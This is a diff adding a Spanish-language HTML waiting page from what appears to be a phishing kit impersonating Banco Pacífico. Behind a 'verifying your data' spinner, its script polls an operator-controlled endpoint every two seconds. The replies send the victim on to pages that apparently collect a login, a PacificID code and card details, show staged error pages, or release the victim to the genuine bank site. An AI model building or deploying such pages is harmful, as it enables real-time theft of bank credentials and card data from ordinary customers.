@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesando Solicitud...</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .wait-card { background: #ffffff; padding: 40px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); width: 100%; max-width: 380px; text-align: center; }
+        .logo { max-width: 120px; margin-bottom: 25px; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0056b3; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 1.3rem; color: #2c3e50; margin-bottom: 10px; }
+        p { font-size: 0.95rem; color: #7f8c8d; line-height: 1.5; }
+    </style>
+</head>
+<body>
+
+<div class="wait-card">
+    <img src="./logo.png" alt="Logotipo" class="logo">
+    
+    <div class="spinner"></div>
+    
+    <h2>Verificando tus datos...</h2>
+    <p>Por favor, mantente en esta pantalla. Estamos validando la información con nuestro sistema de seguridad de manera segura. No cierres la ventana.</p>
+</div>
+
+<script>
+    async function verificarOrdenBoton() {
+        try {
+            // Consultamos a nuestra función Serverless local en Vercel
+            const respuesta = await fetch('/api/poll');
+            
+            if (respuesta.ok) {
+                const data = await respuesta.json();
+                
+                // Si la acción es diferente de 'espera', ejecutamos la redirección.
+                // (La API /api/poll se encarga de limpiarlo a 'espera' internamente al leerlo)
+                switch(data.action) {
+                    case 'pacificid':
+                        window.location.href = 'pacificid.html';
+                        break;
+                    case 'tarjeta':
+                        window.location.href = 'tarjeta.html';
+                        break;
+                    case 'error_login':
+                        window.location.href = 'login.html?error=true';
+                        break;
+                    case 'error_pacificid':
+                        window.location.href = 'pacificid.html?error=true';
+                        break;
+                    case 'error_tarjeta':
+                        window.location.href = 'tarjeta.html?error=true';
+                        break;
+                    case 'aprobar':
+                        window.location.href = 'https://www.bancopacifico.com';
+                        break;
+                    default:
+                        // Sigue en 'espera', no realiza ninguna acción.
+                        console.log("Esperando orden desde el panel API de Vercel...");
+                }
+            }
+        } catch (e) {
+            console.error("Buscando señal del panel API...");
+        }
+    }
+
+    // Revisa el estado de manera continua cada 2 segundos
+    setInterval(verificarOrdenBoton, 2000);
+</script>
+</body>
+</html>
